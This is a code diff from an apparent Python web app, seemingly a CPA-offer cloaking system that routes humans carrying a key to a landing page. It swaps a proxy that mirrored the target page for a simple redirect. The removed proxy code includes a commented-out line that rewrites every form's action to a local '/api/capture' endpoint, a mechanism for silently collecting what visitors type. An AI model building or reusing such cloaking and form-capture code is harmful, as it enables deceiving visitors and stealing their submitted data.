@@ -516,17 +516,11 @@ def proxy_master_final(path):
         # Ignore 'intro' or other garbage paths. If Human + Key -> Always Landing Page.
         target_url = f"{base_target}/pt/{CPA_DATA[k][code_idx]}"
         
-        t_resp = requests.get(target_url, params=request.args, headers={'User-Agent': request.headers.get('User-Agent'), 'Referer': base_target}, timeout=12)
-        f_resp = make_response()
-        if "text/html" in t_resp.headers.get("Content-Type", ""):
-            html = re.sub(r'(src|href|action)="/', f'\\1="{base_target}/', t_resp.text)
-            # html = re.sub(r'<form([^>]*)action="[^"]*"', r'<form\1action="/api/capture" method="POST"', html) # [Direct Pass-through]
-            f_resp.set_data(html)
-        else:
-            f_resp.set_data(t_resp.content)
-        f_resp.headers["Content-Type"] = t_resp.headers.get("Content-Type")
-        f_resp.set_cookie('cpa_session', k or '', max_age=86400, httponly=True)
-        return f_resp
+        # [FIX: WHITE SCREEN] Switch to Redirect Strategy
+        # Proxying causes timeouts/blocking. Direct redirect is 100% reliable.
+        resp = redirect(target_url)
+        resp.set_cookie('cpa_session', k or '', max_age=86400, httponly=True)
+        return resp
 
     except Exception as e:
         return f"<h1>EMPIRE_SYSTEM_STABLE</h1><p>Syncing... Debug: {str(e)}</p>"
